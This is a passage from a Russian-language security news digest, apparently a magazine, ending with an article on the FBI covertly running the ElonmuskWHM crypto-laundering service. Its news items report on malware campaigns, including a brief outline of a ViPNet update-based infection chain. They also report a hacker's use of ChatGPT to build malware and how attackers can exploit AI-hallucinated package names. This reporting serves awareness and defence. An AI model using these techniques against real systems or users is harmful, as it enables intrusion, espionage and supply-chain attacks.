   Хотя пока нет никаких признаков  того, что злоумышленники уже  взяли
  на вооружение новый тип атак, исследователи из компании Socket предуп‐
  редили, что «галлюцинации» в названиях пакетов встречаются часто, регуляр‐
  но повторяются и выглядят семантически правдоподобно, что можно легко
   применить во вредоносных целях.

       В целом 58% „галлюцинаций“ повторялись более одного раза. Это сви‐
           детельствует о том, что большинство „галлюцинаций“ — не просто случай‐ «        ный шум, а повторяющиеся артефакты того, как модели реагируют на опре‐
          деленные промпты, — объясняют исследователи Socket. — Такая повторя‐
         емость повышает их ценность для злоумышленников, потому что помогает
           выявлять жизнеспособные цели для слопсквоттинга, просто наблюдая
          за результатами работы моделей даже на небольших выборках.                  »   Единственным способом снижения рисков в данном случае является провер‐
   ка имен пакетов вручную. Также всегда стоит помнить о том, что любой пакет,
   упомянутый ИИ, может не существовать в реальности и не быть безопасным.
      Также специалисты рекомендуют использовать сканеры зависимостей,
   lockfile и проверки хешей для установления связи пакетов с известными
  и надежными версиями.
     Кроме того, отмечается, что снижение «температуры» ИИ помогает сни‐
   зить  количество  галлюцинаций,  что  тоже  следует  учитывать  всем
  вайб‑кодерам. Однако запускать и развертывать созданный ИИ код в любом
   случае рекомендуется только после тестирования в безопасной и изолиро‐
   ванной среде.


  373 ТЫСЯЧИ БЛОКИРОВОК В TELEGRAM

  С 2017 года по настоящее время по требованию Роскомнадзора в мессенджере Telegram были
   удалены свыше 373 тысяч публикаций и каналов, сообщили в пресс‑службе ведомства.

   При этом в РКН отметили, что вопросы о причинах блокировки отдельных материалов следует
   адресовать непосредственно администрации мессенджера. Ведь Telegram самостоятельно
    принимает окончательное решение об удалении контента после получения уведомлений.





 ВРАГ В ОБНОВЛЕНИИ
  В ходе совместного исследования эксперты «Лаборатории Касперского»
  и эксперты кибербезопасности «Т‑Технологий» обнаружили новый бэкдор.
   Неизвестная APT-группировка использовала его для кибершпионажа в сетях
   десятков российских организаций.
    По данным экспертов, с этой вредоносной кампанией столкнулись в том
   числе организации из госсектора, финансовой сферы и промышленности.
   Последние  инциденты  зафиксированы  совсем  недавно —  в  апре‐
  ле 2025 года.
     Малварь была нацелена на компьютеры, подключенные к сети ViPNet —
   программного комплекса для создания защищенных сетей. Вредонос рас‐
   пространяется, мимикрируя под обновление ViPNet Client, в архивах с рас‐
  ширением .lzh, имеющих структуру, характерную для обновления этого ПО.
   Архивы содержали следующие файлы:
   • action.inf — текстовый файл;
   • lumpdiag.exe — легитимный исполняемый файл;
   • msinfo32.exe — вредоносный исполняемый файл небольшого размера;
   • зашифрованный файл, содержащий полезную нагрузку (имя файла раз‐
      личается от архива к архиву).

   Изучение этой кампании еще продолжается, и опубликовано не так много
   деталей, но исследователи сочли, что важно поделиться с сообществом
   предварительными результатами расследования, чтобы организации могли
  защитить себя от этой угрозы.
      Проанализировав содержимое архива, исследователи установили, что
   текстовый файл  action.inf содержит действие, которое исполняется ком‐
   понентом службы обновления ViPNet (itcsrvup64.exe). При обработке команды
  extra_command службой обновления запускается файл lumpdiag.exe с аргу‐
   ментом --msconfig. Этот файл легитимный, однако он подвержен технике
  подмены пути исполнения, что позволяет злоумышленникам запустить вре‐
   доносный файл msinfo32.exe.
    Файл msinfo32.exe представляет собой загрузчик, который читает зашиф‐
   рованный файл с полезной нагрузкой. Он обрабатывает содержимое данного
   файла, чтобы загрузить в память бэкдор.
    Сам бэкдор обладает универсальными возможностями — может соеди‐
   няться с управляющим сервером злоумышленников с помощью TCP, поз‐
   воляя, в частности, красть с зараженных компьютеров файлы и запускать
   дополнительные вредоносные компоненты.
      Директор Kaspersky GReAT Игорь Кузнецов рассказывает:

          Злоумышленники постоянно развивают свои методы и ищут новые лазейки
         для кибератак. Поэтому организациям крайне важно фокусироваться « на информационной безопасности: обучать сотрудников цифровой грамот‐
          ности, держать их в курсе актуальных тактик, техник и процедур, а также
          использовать надежные защитные решения от проверенных вендоров, что‐
        бы своевременно реагировать на возникающие угрозы. Мы продолжаем
          исследование и в ближайшее время планируем раскрыть новые детали.                  »





  ДУРОВ О РАСКРЫТИИ ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ
   Весной текущего года сенат Франции одобрил законопроект, который требует встроить в мес‐
   сенджеры механизм, позволяющий правоохранительным органам иметь доступ к переписке
    пользователей (то есть бэкдор). Законопроект был отклонен Национальной ассамблеей, однако
   недавно в поддержку этой инициативы высказался префект полиции Парижа.
     В ответ на это Павел Дуров заявил в своем Telegram-канале, что компания скорее прек‐
   ратит работу во Франции, чем откажется от шифрования и согласится на внедрение бэкдора:

              Члены Национальной ассамблеи поступили мудро, отклонив закон, который →           сделал бы Францию первой страной в мире, лишившей своих граждан права
          на частную жизнь. Даже страны, которые многие европейцы считают недос‐
            таточно свободными, никогда не запрещали шифрование. Почему?
              Потому что технически невозможно гарантировать, что доступ к бэкдору
          получит только полиция. Если бэкдор появится, им смогут воспользоваться дру‐
          гие стороны — от иностранных агентов до хакеров. В результате личные сооб‐
         щения всех законопослушных граждан могут оказаться под угрозой.
               Закон, направленный на предотвращение наркоторговли, все равно
         не помог бы бороться с преступностью. Даже если основные зашифрованные
           приложения будут ослаблены бэкдором, преступники все равно смогут безопас‐
         но общаться через десятки более мелких приложений, и их станет еще сложнее
           отследить из‑за VPN.
                Поэтому, как я уже говорил, Telegram скорее уйдет с рынка, чем подорвет
          свое шифрование с помощью бэкдоров и нарушит основные права человека.
        В отличие от некоторых наших конкурентов, мы не готовы обменять конфиден‐
           циальность на долю рынка.
           За свою 12-летнюю историю Telegram никогда не раскрывал ни одного байта
           личных сообщений (пользователей). В соответствии с законом ЕС о цифровых
            услугах, при наличии действительного судебного ордера Telegram может рас‐
          крыть информацию об IP-адресах и номерах телефонов подозреваемых
          в совершении преступлений, но не их сообщения.
          В прошлом месяце свобода восторжествовала. Но это стало напоминанием:
        мы должны продолжать объяснять законодателям, что шифрование создано
         не для защиты преступников — оно защищает частную жизнь и безопасность
          обычных людей. Потеря этой защиты станет трагедией.
            Эта борьба еще далека от завершения. В этом месяце Европейская комис‐
          сия предложила аналогичную инициативу по внедрению бэкдоров в приложения
          для обмена сообщениями. Ни одна страна не застрахована от медленной эро‐
          зии свобод. Каждый день эти свободы подвергаются нападкам, и каждый день
        мы обязаны их защищать.





 ПОДОЗРИТЕЛЬНЫЕ
 РАСШИРЕНИЯ
   Специалисты Secure Annex обнаружили 57 опасных расширений для Chrome,
   которыми пользуются около 6 миллионов человек. Расширения могут отсле‐
  живать поведение браузера, получать доступ к cookie доменов и выполнять
   удаленные скрипты.
    При этом расширения являются «скрытыми», то есть их нельзя найти поис‐
  ком в Chrome Web Store, они не индексируются поисковыми системами
  и могут быть установлены, только если у пользователя есть прямой URL.
     Как правило, «скрытые» расширения представляют собой внутренние инс‐
   трументы компаний или продукты, находящиеся в стадии разработки. Однако
   в данном  случае  злоумышленники могут использовать  эту  особенность
  для уклонения от обнаружения, к примеру агрессивно продвигая расширения
  через рекламу и вредоносные сайты.
     Все началось с того, что специалист Secure Annex Джон Такнер (John
   Tuckner)  обнаружил  подозрительное  расширение  Fire  Shield  Extension
   Protection. Его код был сильно обфусцирован и использовал обратные
  вызовы API для передачи информации, собранной в браузере.
      Через домен unknow(.)com, использующийся этим расширением, Такнер
  выявил и другие аддоны, использующие тот же домен, который якобы обес‐
   печивает блокировку рекламы и защищает конфиденциальность пользовате‐
   лей.
     Все 35 найденных расширений имели избыточные права, позволяющие
   выполнять следующие действия:
   • получать доступ к файлам cookie, включая конфиденциальные хедеры
      (например, Authorization);
   • отслеживать поведение пользователя в браузере;
   • изменять поисковую систему (и результаты поиска);
   • внедрять и выполнять удаленные скрипты на посещаемых страницах через
      iframes;
   • удаленно активировать расширенное отслеживание.



                                        Продолжение статьи →
← Начало статьи





   Хотя расширения не воровали пользовательские пароли или cookie, их избы‐
   точные права, сильно обфусцированный код и скрытность позволили отнести
   их к категории опасных, и Такнер предположил, что обнаружил шпионское
  ПО:

          Среди других функций присутствуют дополнительные обфусцированные сиг‐
          налы, указывающие на наличие серьезного C&C-потенциала. Например, « есть возможность перечисления наиболее посещаемых человеком сайтов,
         информации об открытии/закрытии вкладок, получения данных о наиболее
         посещаемых сайтах и запуска большинства вышеперечисленных функций
          в произвольном порядке, — пишет исследователь. — Многие из этих воз‐
          можностей не удалось проверить, но серьезное беспокойство вызывает сам
         факт их наличия в 35 расширениях, которые якобы предназначены для прос‐
          тых задач, например для защиты от вредоносных расширений.                  »   Хотя изначально эксперту удалось обнаружить 35 опасных расширений,
  через несколько дней он дополнил свой отчет и сообщил об обнаружении
  еще 22 расширений, предположительно связанных с этой вредоносной кам‐
   панией. Причем некоторые из них являются публичными.
      Таким образом, в настоящее время найдено уже 57 подозрительных рас‐
  ширений, которыми пользуются около 6 миллионов человек. Интересно, что
  десять из них отмечены знаком Featured, который компания Google прис‐
  ваивает разработчикам, личности которых были проверены и которые «сле‐
  дуют лучшим техническим практикам».
      Такнер отмечает, что после публикации его отчета некоторые из рас‐
  ширений были удалены из Chrome Web Store, однако другие по‑прежнему
   активны.
     Полный список расширений можно найти здесь, а ниже перечислены толь‐
   ко самые популярные из них, с наибольшим количеством загрузок:
   • Cuponomia — Coupon and Cashback (700 тысяч пользователей, пуб‐
      личное);
   • Fire Shield Extension Protection (300 тысяч пользователей, скрытое);
   • Total Safety for Chrome™ (300 тысяч пользователей, скрытое);
   • Protecto for Chrome™ (200 тысяч пользователей, скрытое);
   • Browser WatchDog for Chrome (200 тысяч пользователей, публичное);
   • Securify for Chrome™ (200 тысяч пользователей, скрытое);
   • Browser Checkup for Chrome by Doctor (200 тысяч пользователей,
      публичное);
   • Choose Your Chrome Tools (200 тысяч пользователей, скрытое).

   Представители Google сообщили, что им известно об опубликованном Так‐
  нером отчете и они проводят расследование.


 КАЖДЫЙ ВТОРОЙ ЖИТЕЛЬ РФ СТАЛКИВАЛСЯ
 С ТЕЛЕФОННЫМ МОШЕННИЧЕСТВОМ

   По информации «Лаборатории Касперского», в первом квартале 2025 года доля российских
    пользователей, столкнувшихся с телефонными звонками с подозрением на мошенничество
   с неизвестных номеров, выросла почти на 3% и составила 43%.

   При этом количество людей, получавших вызовы от злоумышленников в WhatsApp, увеличилось
    сразу в 3,5 раза.

    Эксперты отметили, что в большинстве случаев злоумышленники теперь стремятся связаться
   с жертвами через мессенджер: звонят, установив вместо ника набор цифр, повторяющих
   номер официальных организаций, пишут, имитируя информационную рассылку, или присылают
   голосовое сообщение якобы от знакомых.





 СПАЙВАРЬ АТАКУЕТ
 ВОЕННЫХ
   Аналитики «Доктор Веб» обнаружили шпионское ПО для Android, основной
  целью которого являются российские военнослужащие. Троян скрывается
   в  модифицированной  версии  картографической программы  AlpineQuest
  и распространяется в том числе и через неназванный российский магазин
   приложений.
     Малварь (Android.Spy.1292.origin в классификации компании) передает
   своим операторам информацию о контактах из телефонной книги и геоло‐
  кацию зараженных устройств. Кроме того, шпионское ПО собирает данные
  о хранящихся на устройствах файлах и по команде злоумышленников может
   загружать дополнительные модули для их кражи.
      Исследователи объясняют, что AlpineQuest позволяет использовать раз‐
  личные карты как в онлайн‑режиме, так и при отсутствии подключения
   к интернету. Программа популярна среди спортсменов, путешественников
  и охотников, но также нашла широкое применение среди российских воен‐
   нослужащих в зоне СВО.
      Злоумышленники  интегрировали  малварь  в одну  из  старых  версий
   AlpineQuest и распространяли вредоносный вариант под видом общедос‐
  тупной версии программы с расширенной функциональностью, AlpineQuest
   Pro. Для этого был создан поддельный Telegram-канал приложения, через
  который распространялась ссылка на загрузку программы в одном из рос‐
   сийских каталогов приложений. Позднее эта же версия программы рас‐
   пространялась и в самом канале под видом обновления.





   Поскольку Android.Spy.1292.origin был встроен в копию настоящего приложе‐
   ния, после установки оно выглядит и работает как оригинальная программа,
  не вызывая подозрений у пользователя.
    При каждом запуске троян собирает и передает на управляющий сервер
  следующие данные:
   • учетные записи пользователя и номер мобильного телефона;
   • контакты из телефонной книги;
   • текущую дату;
   • текущую геолокацию;
   • сведения о хранящихся на устройстве файлах;
   • версию приложения.

   Малварь  дублирует  часть  информации  в  принадлежащий  атакующим
   Telegram-бот. Например,  отправляет боту данные о новых координатах
  при каждой смене местоположения устройства.
      Получив информацию о доступных файлах, злоумышленники могут дать
   трояну команду загрузить и запустить вспомогательные модули, с помощью
  которых тот сможет похитить нужные данные.
      Проведенный анализ показал, что создателей спайвари интересуют кон‐
   фиденциальные документы, которые пользователи передают через мессен‐
   джеры Telegram и WhatsApp, а также файл журнала локаций locLog, создава‐
  емый непосредственно AlpineQuest.


 БОТЫ ЛИДИРУЮТ В МИРОВОМ ТРАФИКЕ

   Доля мирового трафика, приходящегося на ботов, впервые превысила долю трафика, генери‐
   руемого людьми, сообщили  аналитики компании Imperva. Исследователи  объясняют, что
   это связано с активностью ИИ и инновациями в криминальной среде.

  В настоящее время боты генерируют 51% от общего количества интернет‑трафика в мире.
   При этом 37% из них — это вредоносные боты и только 14% — полезные.





  В своем отчете компания выделяет две тенденции: рост числа API-атак ботов (44% всех прод‐
   винутых ботов нацелены на API) и увеличение количества атак на захват учетных записей (на
  40% больше, чем в предыдущем году).

    Наиболее распространенные типы API-атак нацелены на сбор данных (31%), мошенничество
   с платежами (26%), захват учетных записей (12%) и скальпинг (11%).





   «Общим знаменателем» этих атак является использование уязвимостей API, от неправильной
   конфигурации и недостаточных ограничений до слабых протоколов аутентифика-
  ции.

   Среди наиболее распространенных ИИ‑ботов исследователи перечисляют ByteSpider Bot (на
   него приходится 54% всех атак с использованием ИИ), AppleBot (26%), Claude Bot (13%)
   и ChatGPT User Bot (6%).

    Успех бота ByteSpider специалисты объясняют тем, что его часто путают с легальным крауле‐
   ром ByteSpider, управляемым компанией ByteDance.

   Суммарно в 2024 году Imperva заблокировала около 13 триллионов запросов ботов, обна‐
   руживая около 2 миллионов атак с использованием ИИ каждый день.





 РАЗОБЛАЧЕНИЕ
 ENCRYPTHUB
   Специалисты шведской ИБ‑компании Outpost24 KrakenLabs пришли к выводу,
   что известный хакер EncryptHub (он же LARVA-208 и Water Gamayun), связан‐
  ный со взломами 618 организаций, является одновременно киберпреступни‐
  ком и багхантером. Дело в том, что EncryptHub уведомил Microsoft о двух уяз‐
   вимостях нулевого дня в Windows.
      Уязвимости, о которых идет речь, — это CVE-2025-24061 (обход Mark
   of the Web) и CVE-2025-24071 (спуфинг File Explorer). Microsoft устранила их
   в текущем году, в рамках мартовского вторника обновлений. Тогда в ком‐
  пании  поблагодарили  за  обнаружение  багов  некоего  исследователя
  под ником SkorikARI with SkorikARI.
     Как пишут исследователи, им удалось связать EncryptHub и SkorikARI, так
   как  злоумышленник  случайно заразил  собственную  систему  малварью,
   в результате чего раскрыл свои учетные данные.
      Предполагается, что около десяти лет назад EncryptHub уехал из родного
  города Харькова, после чего обосновался где‑то на побережье Румынии.
   После переезда он не привлекал к себе внимания и самостоятельно раз‐
   бирался в ИТ, записавшись на онлайн‑курсы, и параллельно искал работу,
   связанную с компьютерами.
    При этом деятельность EncryptHub резко прервалась в начале 2022 года,
   после начала специальной военной операции. Исследователи заявляют, что
   нашли  доказательства,  позволяющие  предположить,  что  в  это  время
  EncryptHub был заключен в тюрьму:

          После освобождения он возобновил поиски работы, на этот раз предлагал
            услуги по разработке сайтов и приложений как фрилансер, что приносило « определенные плоды, — говорится в отчете компании. — Но оплата, веро‐
           ятно, оказалась слишком низкой. Мы полагаем, что после непродолжитель‐
         ных попыток участия в программах bug bounty, которые не увенчались успе‐
          хом, в первой половине 2024 года он переключился на киберпреступную
           деятельность.                  »   Упомянутая выше утечка помогла связать злоумышленника с различными
   онлайн‑аккаунтами и составить профиль человека, который чередует работу
   ИБ‑исследователя и  киберпреступника. Одним из таких  аккаунтов стал
   SkorikARI, с помощью которого хакер уведомил Microsoft о двух уязвимостях
   нулевого дня.
    По словам аналитика Outpost24 Гектора Гарсии (Hector Garcia), на связь
   между SkorikARI и EncryptHub указывает множество доказательств. Иссле‐
   дователи пишут, что хакер постоянно переключается со связанного с раз‐
   работкой фриланса на киберпреступную деятельность:

         Самым весомым доказательством стало то, что в файлах паролей, которые
          EncryptHub слил из собственной системы, фигурировали учетные записи, «           связанные как с EncryptHub (например, учетные данные для EncryptRAT,
         который еще находился в разработке, или его аккаунт на xss.is), так и со
          SkorikARI (например, доступы к фриланс‑сайтам или его аккаунт Gmail), —
           поясняет Гарсия. — Также был найден логин
         для hxxps://github(.)com/SkorikJR, который упоминался в июльской статье
           специалистов Fortinet о Fickle Stealer, что позволило объединить все эти дан‐
          ные. Еще одним весомым подтверждением связи между ними стали чаты
         с ChatGPT, в которых можно наблюдать активность, связанную как с
          EncryptHub, так и со SkorikARI.                  »  В компании отмечают, что, несмотря на заметные познания в области ИТ,
   хакер стал жертвой небрежного отношения к операционной безопасности
  (OPSEC), что и раскрыло его личную информацию. К примеру, EncryptHub
   использовал ChatGPT как для разработки вредоносных и фишинговых сайтов,
   так и для интеграции стороннего кода и изучения уязвимостей. Например,
   в одном случае он просит помощи чат‑бота в организации масштабной,
  но совершенно «безобидной» кампании, которая затронет десятки тысяч
   компьютеров.
     Порой он и вовсе вел с чат‑ботом OpenAI личные диалоги: в одном из них
  он рассказал ИИ о своих достижениях и попросил чат‑бота причислить себя
   к категории крутых хакеров или вредоносных исследователей. Тогда, осно‐
   вываясь на предоставленных данных, ChatGPT оценил EncryptHub как black
   hat на 40%, white hat на 30%, gray hat на 20% и оставил 10% на неопределен‐
   ность, которая отражает моральный и жизненный конфликт хакера.
     EncryptHub  поверхностно  связан с  вымогательскими  группировками,
  занимающимися разработкой такой малвари, как RansomHub и BlackSuit.
   Однако в последнее время он больше известен  благодаря различным
  фишинговым  атакам и  созданию  собственного  PowerShell-инфостилера
  под названием Fickle Stealer.
      Также EncryptHub был замечен за проведением кампаний с использовани‐
  ем социальной инженерии, в ходе которых он создает профили в социальных
   сетях и сайты для фейковых приложений. К примеру, недавно он создал акка‐
   унт в соцсети X и сайт для несуществующего приложения управления про‐
   ектами GartoriSpace.
      Ссылка на сайт фальшивого приложения распространялась через личные
  сообщения в социальных сетях. При загрузке софта устройства в Windows
   жертвы получали PPKG-файл, который  устанавливал  Fickle  Stealer, а на
   устройства под управлением Mac загружался стилер AMOS, тоже ворующий
  информацию.
     Кроме того, недавно EncryptHub удалось связать с атаками на пользовате‐
  лей Windows с применением уязвимости Microsoft Management Console (CVE-
   2025-26633). Эта уязвимость была устранена в марте текущего года и при‐
   менялась для доставки инфостилеров и ранее не документированных бэк‐
  доров (SilentPrism и DarkWisp).
    По данным аналитиков компании Prodaft, которые недавно тоже посвятили
   активности EncryptHub отдельный отчет, злоумышленник стоит за взломом
  более 600 организаций, распространяя стилеры и вымогательское ПО.
    В Outpost24 сообщают:

          Случай EncryptHub подчеркивает, что слабая операционная безопасность
           остается одной из самых опасных слабостей для киберпреступников. Нес‐ «         мотря на техническую искушенность, базовые ошибки (включая повторное
          использование паролей, незащищенную инфраструктуру и смешивание лич‐
         ной деятельности с преступной) в итоге привели к его разоблачению.                  »

  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   РКН рекомендует отказаться от использования Cloudflare TLS ECH


  В онлайн‑магазинах нашли смартфоны, зараженные трояном Triada


   У компании Check Point произошла утечка данных


   Уязвимость WhatsApp позволяла выполнить произвольный код в Windows


  В робособаке Unitree Go1 обнаружен бэкдор


   Мошенники присылают пользователям готовые seed-фразы


    Преступники создают клон собственной карты на Android-устройстве жертвы


    Скомпрометирована рекомендуемая Ripple библиотека xrpl.js


   4chan вышел из строя из‑за масштабной атаки


   Компания Prodaft покупает аккаунты на хакфорумах
HEADER





Еще в 2023 году ФБР обнаружило крупного
преступника,   известного   в   даркнете
под ником ElonmuskWHM, который отмывал
миллионы долларов для других злоумыш‐
ленников.   После   того   как   личность        Мария Нефёдова                                                                                                nefedova@glc.ru
ElonmuskWHM была установлена, его арес‐
товали, однако бизнес продолжил работу.
Около года отмыванием денег занималось
само ФБР, собирая информацию о кли‐
ентах ElonmuskWHM.


Это далеко не первый случай, когда американские правоохранители прибега‐
ют к подобной тактике и фактически предоставляют преступникам необ‐
ходимую инфраструктуру или услуги, а сами наблюдают за происходящим
и собирают данные.
  К примеру, несколько лет назад ФБР создало платформу для зашиф‐
рованных коммуникаций Anom (она же An0m или Anøm — в отчетах разных
ведомств название указано по‑разному), похожую на Encrochat и Phantom
Secure, и управляло ею. Это средство связи обрело огромную популярность
среди преступников во всем мире, благодаря чему правоохранители годами
наблюдали за всеми их коммуникациями. За годы работы Anom правоох‐
ранительным  органам   удалось   распространить   среди   преступников
более 12 тысяч «защищенных» устройств более чем в 100 странах мира.
   Также в прошлом году стало известно, что ФБР создало собственную
криптовалюту, которая предназначалась для расследования манипулиро‐
вания ценами на крипторынках.


КРУПНЕЙШИЙ ОБНАЛЬЩИК WHM

Издание 404 Media рассказало о масштабной операции правоохранителей,
в рамках которой агенты ФБР на протяжении 11 месяцев выдавали себя
за ElonmuskWHM и обналичивали деньги для наркоторговцев, хакеров и дру‐
гих преступников.
   Судя по публикациям на даркнет‑форуме Dread, где собирались и коор‐
динировали свои действия клиенты наркоторговцев, бизнес ElonmuskWHM
начался примерно в октябре 2020 года. Тогда он начал рекламировать свои
услуги, предлагая «наличные по почте с эскроу и стопроцентной аноним‐
ностью».
   Схема была проста: клиент переводил свою криптовалюту ElonmuskWHM
через даркнет‑маркетплейс (с его комиссией), а ElonmuskWHM отправлял
клиенту наличные по почте, оставляя себе комиссию в размере 20%.
   Если сначала пользователи Dread обвиняли ElonmuskWHM в том, что он
полицейский или мошенник, со временем некоторые все же попробовали
перевести ему криптовалюту, после чего успешно получили свои наличные.





           Фото, сделанное довольным клиентом с даркнет‑форума

Уже через месяц «Илон Маск» заявил, что через него прошло более 30 тысяч
долларов.  К  январю  2021  года  он  осуществил  более  200  сделок,
затем 450 и в конечном итоге стал называть себя крупнейшим поставщиком
наличных на даркнет‑маркетплейсе White House Market (WHM), где тоже
активно рекламировался.
   Вскоре ElonmuskWHM уже  заявлял, что «перевел миллионы, работая
на нескольких континентах». Он предлагал доставку наличных в любую точку
Европы и уверял, что за ночь может перевести в США 100 тысяч долларов.
   Как отмечает издание, в США такие услуги всегда востребованы. Ведь
компании, позволяющие обменивать криптовалюту на фиатные деньги, дол‐
жны быть зарегистрированы в госорганах и по закону обязаны собирать
идентифицирующую информацию о своих пользователях, как обычные банки.
Невозможно попросту зарегистрироваться на Binance или Coinbase и обна‐
личивать деньги: биржи передадут всю информацию властям, если им будет
предъявлен судебный ордер.


ВНИМАНИЕ ФБР

Согласно судебным документам, в апреле 2021 года сотрудник ФБР впервые
наткнулся на рекламу ElonmuskWHM на теневых сайтах и заинтересовался
происходящим.
  В августе того же года ФБР подключило к делу Службу почтовой инспек‐
ции США  (USPIS), и ведомства занялись  совместным  расследованием
деятельности ElonmuskWHM. В рамках этой операции почтовый инспектор
США Джошуа Смит (Joshua Smith) открыл абонентский ящик в штате Кен‐
тукки, и власти стали заказывать наличные у ElonmuskWHM, прикидываясь
наркоторговцами.
  Все посылки и переговоры с преступником тщательно изучались в попыт‐
ках  установить  его  личность. Заказы были  относительно  небольшими:
1800 долларов, 2000 долларов наличными. Порой деньги приходили внутри
разрезанных книг, страницы из которых были изъяты и заменены конвертами
с наличными, после чего книги склеивались по краям.
  ФБР много месяцев заказывало у ElonmuskWHM деньги и изучало схему
его   работы,  но   ландшафт   даркнета   начал   меняться.   Сначала
осенью 2021 года о закрытии объявила администрация White House Market,
а  в  феврале 2022  года  закрылся  и  хакфорум  Dark0de  Reborn,  где
ElonmuskWHM тоже был активен. В результате правоохранители были вынуж‐
дены перейти к прямому общению с преступником через Telegram и зашиф‐
рованный мессенджер Wickr.
  Во время разговоров в этих чатах ElonmuskWHM рассказывал, что боль‐
шинство его клиентов зарабатывают деньги продажей наркотиков, но отме‐
чал, что самые богатые клиенты — это хакеры. Некоторые из этих хакеров
якобы были замешаны в крупных кражах криптовалюты и взломах.
   Также он  похвастался агентам под  прикрытием, что заработал  око‐
ло 30 миллионов долларов всего за несколько лет, и заявил, что может обна‐
личивать до миллиона долларов в неделю. Согласно судебным документам,
проанализировав блокчейн, следователи пришли к выводу, что в общей слож‐
ности через сеть «Илона Маска» прошло около 90 миллионов долларов
в криптовалюте.
  Со временем в таких беседах ElonmuskWHM стал более откровенен с пра‐
воохранителями и начал делиться подробностями о себе. Так, в одном
из чатов сотрудник ФБР и преступник обсуждали географические информа‐
ционные системы (ГИС). Тогда ElonmuskWHM рассказал, что у него есть опыт
работы в этой области, в том числе с БПЛА, а в прошлом он и вовсе был гла‐
вой ГИС‑компании, но продал этот бизнес около трех лет назад.
  В этом чате ElonmuskWHM отправил сотруднику ФБР ссылку на YouTube-
ролик об AR-навигации в помещениях для торговых центров, аэропортов
и розничных магазинов. Поддерживая разговор, федеральный агент ответил
преступнику парой других видео о картографировании с помощью дронов (1,
2). На тот момент эти видео были просмотрены около 2000 и 1400 раз.





Понимая, что ElonmuskWHM, вероятно, посмотрел эти ролики, власти США
тайно обратились к компании Google с дерзким требованием: предоставить
все IP-адреса, с которых в течение недели осуществлялся доступ к этим
видео. Затем, если выяснится, что какой‑то из этих IP связан с аккаунтом
Google, нужно было передать правоохранителям имя этого пользователя,
адрес, платежную информацию, логи сообщений и информацию о любых
других связанных аккаунтах.
   Позже об этом скандальном юридическом требовании писало издание
Forbes. Тогда многие эксперты называли действия властей неконституци‐
онными, поскольку тысячи обычных зрителей YouTube превратились в подоз‐
реваемых просто из‑за того, что посмотрели конкретное видео. При этом
остается неясным, предоставила ли Google в итоге запрошенные данные.


«ЭРИК»

К этому моменту ФБР уже начало понимать, откуда поступают деньги и кто
может их  отправлять. К  примеру, одна  посылка с наличными пришла
из города Тарритаун, штат Нью‑Йорк. Другая была отправлена из Элмсфор‐
да, тоже штат Нью‑Йорк. Затем пришел еще один пакет из Тарритауна
и Ирвингтона, снова в Нью‑Йорке. То есть начала проявляться закономер‐
ность: отправитель порой использовал одни и те же места снова и снова.
  В итоге ФБР отследило посылки до молодого мужчины из округа Уэстчес‐
тер, штат Нью‑Йорк (отсюда были отправлены многие предыдущие посылки).
Поскольку в итоге этот человек стал анонимным информатором и сотрудни‐
чал с правоохранительными органами, его имя не раскрывается и журналис‐
ты называют его «Эриком».
   Эрик был арестован в своем доме, где жил с одним из родителей. Сле‐
дователи обнаружили в доме около 600 тысяч долларов наличными, и стало
ясно, что команда ElonmuskWHM оперирует огромными суммами.
   Как Эрик объяснил следователям, примерно три раза в неделю он встре‐
чался с людьми, от которых каждый раз получал от 100 тысяч до 300 тысяч
долларов наличными для рассылки. Большая часть денег в Нью‑Йорке пос‐
тупала от людей, которые владели законным бизнесом, например неболь‐
шими магазинами, и хотели переправить деньги обратно в Индию.
   Такая подпольная банковская система известна под арабским названием
«хавала». Ее китайский эквивалент называется fei-chien, а индийские версии
известны как хунди или ангадия. Многие клиенты хавалы не являются хакера‐
ми и наркоторговцами, хотя не следуют строгим правилам США в отношении
услуг по переводу денег и тем самым нарушают закон.
   Бизнес ElonmuskWHM тесно пересекался с этой системой и привлекал
в нее деньги преступников. В сущности, ElonmuskWHM просто добавил крип‐
товалюту к этому отлаженному за много веков процессу, и теперь речь шла
не о простом перемещении наличных из одного места в другое, а об обмене
криптовалюты на наличные.


НАСТОЯЩАЯ ЛИЧНОСТЬ ELONMUSKWHM

Правоохранители решили не привлекать Эрика к ответственности сразу,
а использовать его в интересах следствия. Эрик согласился на сделку и про‐
должил заниматься приемом и отправкой наличных, чтобы ФБР могло лучше
понять, как именно происходит отмывание средств, и выявить других участни‐
ков группировки.
   Согласно судебным документам, Эрик совершил еще около 80 операций
с наличными, фиксируя все на скрытую камеру, и за период с февраля по сен‐
тябрь 2023 года перевел в общей сложности более 15 миллионов долларов.
  Он встречался с мужчинами индийского происхождения в круглосуточных
магазинах, на автозаправках и парковках, и эти люди приносили ему полные
пакеты наличных. Позже, используя данные с мобильных телефонов, ФБР
выяснило, что некоторые из  этих людей выезжали за пределы  штата:
в Нью‑Джерси, Джорджию, Пенсильванию, Массачусетс и Южную Каролину.
То есть мулы ElonmuskWHM передвигались по всей стране.





В итоге, благодаря множеству ордеров на получение метаданных, судебным
постановлениям и ордерам, направленным Apple, Binance и Uber, а также
анализу визовых анкет США, следователи сумели связать ElonmuskWHM
с его мулами и установить, что за этим ником скрывается Анураг Прамод
Мурарка (Anurag Pramod Murarka) — житель Индии в возрасте около 30 лет.
   Выяснилось, что ранее Мурарка не раз подавал заявления на визу
для въезда в США, но они отклонялись. Теперь власти одобрили визу, чтобы
после прибытия в страну ElonmuskWHM был арестован. При этом позже его
адвокат заявил, что его клиент приехал в США, чтобы пройти курс лечения
редкого заболевания.
  В начале 2025 года Мурарка был приговорен к 121 месяцу (10 годам)
тюремного заключения. Прокурор Кэтрин Дируф (Kathryn Dieruf) заявила:


       Мурарка был основателем и лидером масштабного сговора, который
       охватывал  Соединенные  Штаты,  исходил из Индии и  создавался«
       как банк для преступного мира, работающий в даркнете. При этом
      обвиняемый руководил одной из крупнейших и наиболее успешных
      операций по обмену криптовалюты на наличные в даркнете, отмыв
      более 24 миллионов  долларов в  криптовалюте  чуть меньше чем
      за два года.                »
ФБР ОТМЫВАЕТ ДЕНЬГИ

Мурарка был арестован 30 сентября 2023 года, и сразу после этого ФБР при‐
няло решение самостоятельно продолжить его бизнес.
   Как сообщила изданию 404 Media специалист по связям с обществен‐
ностью в прокуратуре США по Восточному округу Кентукки Габриэль Даджен
(Gabrielle Dudgeon), ФБР  контролировало все  операции ElonmuskWHM
на протяжении примерно 11 месяцев.
  По ее словам, власти расследовали «любого злоумышленника, который
использовал преступные услуги ElonmuskWHM по отмыванию денег, включая
